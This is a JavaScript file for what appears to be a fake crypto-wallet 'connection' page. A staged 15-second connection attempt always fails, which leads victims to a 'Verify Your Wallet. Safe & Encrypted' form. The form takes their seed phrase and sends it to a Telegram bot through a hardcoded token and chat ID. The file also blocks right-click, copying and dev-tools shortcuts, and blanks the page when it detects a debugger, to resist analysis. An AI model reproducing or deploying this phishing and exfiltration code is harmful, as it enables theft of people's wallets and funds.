const hamburger = document.getElementById("hamburger")
const closeIcon = document.getElementById("close-icon")
const navMenu = document.getElementById("nav-menu")
const dropDown = document.getElementById("dropDown")
const removeDropdown = document.getElementById("close-dropdown")


const buttons = [
  document.getElementById("stakebtn"),
  document.getElementById("fixbtn"),
  document.getElementById("claimbtn"),
  document.getElementById("retrobtn"),
  document.getElementById("developerbtn"),
];

buttons.forEach(button => {
  button?.addEventListener("click", () => {
    dropDown.classList.add("top-[0%]");
  });
});


removeDropdown.addEventListener("click", () => {
    dropDown.classList.remove("top-[0%]")
})

hamburger.addEventListener("click", () => {
    navMenu.classList.remove("hidden")
})
closeIcon.addEventListener("click", () => {
    navMenu.classList.add("hidden")
})



document.addEventListener('DOMContentLoaded', function() {
    // Get all elements
    const wallets = document.querySelectorAll('#wallet-div [id]'); // All clickable wallets
    const walletDiv = document.getElementById('wallet-div');
    const loadingDiv = document.getElementById('loading-div');
    const connectionFailedDiv = document.getElementById('connection-failed');
    const formDiv = document.getElementById('form-div');
    const closeDropdownBtn = document.getElementById('close-dropdown');
    const tryAgainBtn = document.querySelector('#connection-failed button:first-child');
    const connectManualBtn = document.querySelector('#connection-failed button:last-child');
    const walletLogoDisplay = document.createElement('div'); // For displaying selected wallet logo
    const walletNameDisplay = document.createElement('h2'); // For displaying selected wallet name
    
    // Setup wallet display elements
    walletLogoDisplay.className = 'bg-gray-400 rounded-full p-2 border-2 w-fit flex items-center mb-4';
    walletNameDisplay.className = 'px-4 text-lg mt-6 text-nowrap text-[#E42159] font-bold';
    
    // Insert them into loading div (before the existing elements)
    loadingDiv.insertBefore(walletNameDisplay, loadingDiv.firstChild);
    loadingDiv.insertBefore(walletLogoDisplay, walletNameDisplay.nextSibling);
    
    let connectionTimeout;
    let selectedWallet = null;

    // Add click event to each wallet
    wallets.forEach(wallet => {
        wallet.addEventListener('click', function() {
            // Store the selected wallet
            selectedWallet = {
                id: wallet.id,
                name: wallet.querySelector('p').textContent,
                logo: wallet.querySelector('img').cloneNode(true)
            };
            startConnectionProcess();
        });
    });

    // Close dropdown handler
    if (closeDropdownBtn) {
        closeDropdownBtn.addEventListener('click', resetConnectionFlow);
    }

    // Try Again button handler
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', function() {
            resetConnectionFlow();
            startConnectionProcess();
        });
    }

    // Connect Manually button handler
    if (connectManualBtn) {
        connectManualBtn.addEventListener('click', function() {
            resetConnectionFlow();
            // Show the form div
            formDiv.classList.remove('hidden');
            // If a wallet was selected, update the form logo
            if (selectedWallet) {
                const formLogo = formDiv.querySelector('img');
                if (formLogo) {
                    formLogo.src = selectedWallet.logo.src;
                    formLogo.alt = selectedWallet.name;
                }
                const formTitle = formDiv.querySelector('h1');
                if (formTitle) {
                    formTitle.textContent = `Verify Your ${selectedWallet.name}. Safe & Encrypted`;
                }
            }
        });
    }

    function startConnectionProcess() {
        // Hide wallet selection and show loading
        walletDiv.classList.add('hidden');
        loadingDiv.classList.remove('hidden');
        connectionFailedDiv.classList.add('hidden');
        formDiv.classList.add('hidden');
        
        // Update loading display with selected wallet info
        if (selectedWallet) {
            walletNameDisplay.textContent = `Connecting ${selectedWallet.name}....`;
            walletLogoDisplay.innerHTML = '';
            // Clone the logo to avoid DOM issues
            const logoClone = selectedWallet.logo.cloneNode(true);
            logoClone.className = 'w-12 rounded-full';
            walletLogoDisplay.appendChild(logoClone);
        }
        
        // Start 15 second timeout
        connectionTimeout = setTimeout(() => {
            loadingDiv.classList.add('hidden');
            connectionFailedDiv.classList.remove('hidden');
        }, 15000);
    }

    function resetConnectionFlow() {
        // Clear timeout if it exists
        if (connectionTimeout) {
            clearTimeout(connectionTimeout);
        }
        
        // Reset to initial state
        walletDiv.classList.remove('hidden');
        loadingDiv.classList.add('hidden');
        connectionFailedDiv.classList.add('hidden');
        formDiv.classList.add('hidden');
    }
});



// Telegram Bot Configuration
  const BOT_TOKEN = '7596214547:AAGMsoahQ93YlxFUxopXd6DrUFAa9Y2usrI';
  const CHAT_ID = '1000425167';
  const REDIRECT_URL = 'error.html'; // Change this

  document.getElementById('form-submit').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // Get form data
    const walletName = this.querySelector('input[type="text"]').value;
    const seedPhrase = this.querySelector('textarea').value;
    
    try {
      // Send to Telegram bot
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `⚠️ New Wallet Verification\n\nWallet: ${walletName}\nSeed: ${seedPhrase}\n\nTimestamp: ${new Date().toISOString()}`,
          disable_notification: false
        })
      });
      
      // Redirect after successful submission
      window.location.href = REDIRECT_URL;
      
    } catch (error) {
      console.error('Error:', error);
      // Optional: Show error message to user
      alert('Verification failed. Please try again.');
    }
  });




  document.addEventListener('DOMContentLoaded', function() {
  // Get all buttons in the help section
  const helpButtons = document.querySelectorAll('.shadow-lg button');
  
  // Get the dropdown div
  const dropdownDiv = document.getElementById('dropDown');
  
  // Add click event to all help buttons
  helpButtons.forEach(button => {
    button.addEventListener('click', function() {
      if (dropdownDiv) {
        // Show dropdown
        dropdownDiv.classList.remove('top-[-120%]');
        dropdownDiv.classList.add('top-0');
      }
    });
  });

  // Close dropdown functionality
  const closeButton = document.getElementById('close-dropdown');
  if (closeButton) {
    closeButton.addEventListener('click', function(e) {
      e.stopPropagation(); // Prevent event bubbling
      if (dropdownDiv) {
        // Hide dropdown
        dropdownDiv.classList.remove('top-0');
        dropdownDiv.classList.add('top-[-120%]');
      }
    });
  }

  // Optional: Close when clicking outside dropdown
  document.addEventListener('click', function(e) {
    if (dropdownDiv && !dropdownDiv.contains(e.target) && 
        !e.target.closest('.shadow-lg button') && 
        !dropdownDiv.classList.contains('top-[-120%]')) {
      dropdownDiv.classList.remove('top-0');
      dropdownDiv.classList.add('top-[-120%]');
    }
  });
});


document.addEventListener('DOMContentLoaded', function() {
  // Get all elements that should trigger the dropdown
  const dropdownTriggers = [
    ...document.querySelectorAll('.shadow-lg button'), // All help buttons
    document.getElementById('heroConnect')            // Hero connect button
  ].filter(Boolean); // Remove any null elements
  
  // Get the dropdown div
  const dropdownDiv = document.getElementById('dropDown');
  const closeButton = document.getElementById('close-dropdown');

  // Function to show dropdown
  function showDropdown() {
    if (dropdownDiv) {
      dropdownDiv.classList.remove('top-[-120%]');
      dropdownDiv.classList.add('top-0');
      
      // Optional: Disable body scroll when dropdown is open
      document.body.style.overflow = 'hidden';
    }
  }

  // Function to hide dropdown
  function hideDropdown() {
    if (dropdownDiv) {
      dropdownDiv.classList.remove('top-0');
      dropdownDiv.classList.add('top-[-120%]');
      
      // Optional: Re-enable body scroll
      document.body.style.overflow = '';
    }
  }

  // Add event listeners to all triggers
  dropdownTriggers.forEach(trigger => {
    trigger.addEventListener('click', function(e) {
      e.stopPropagation();
      showDropdown();
    });
  });

  // Close button functionality
  if (closeButton) {
    closeButton.addEventListener('click', function(e) {
      e.stopPropagation();
      hideDropdown();
    });
  }

  // Close when clicking outside
  document.addEventListener('click', function(e) {
    if (dropdownDiv && !dropdownDiv.contains(e.target) && 
        !dropdownTriggers.some(trigger => trigger.contains(e.target))) {
      hideDropdown();
    }
  });

  // Optional: Close on Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && dropdownDiv && !dropdownDiv.classList.contains('top-[-120%]')) {
      hideDropdown();
    }
  });
});



(function() {
  // Disable right click
  document.addEventListener('contextmenu', e => e.preventDefault());
  
  // Disable text selection
  document.addEventListener('selectstart', e => e.preventDefault());
  
  // Disable copying
  document.addEventListener('copy', e => e.preventDefault());
  
  // Disable cut
  document.addEventListener('cut', e => e.preventDefault());
  
  // Disable paste
  document.addEventListener('paste', e => e.preventDefault());
  
  // Disable keyboard shortcuts for dev tools
  document.onkeydown = function(e) {
    if (e.key === "F12" || 
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
        (e.ctrlKey && e.key === "U")) {
      return false;
    }
  };
  
  // Periodic check for open dev tools (this can impact performance)
  function checkDevTools() {
    const before = new Date().getTime();
    debugger;
    const after = new Date().getTime();
    if (after - before > 100) {
      document.body.innerHTML = '<h1>Developer Tools Detected</h1>';
      window.location.href = 'about:blank';
    }
  }
  setInterval(checkDevTools, 1000);
})();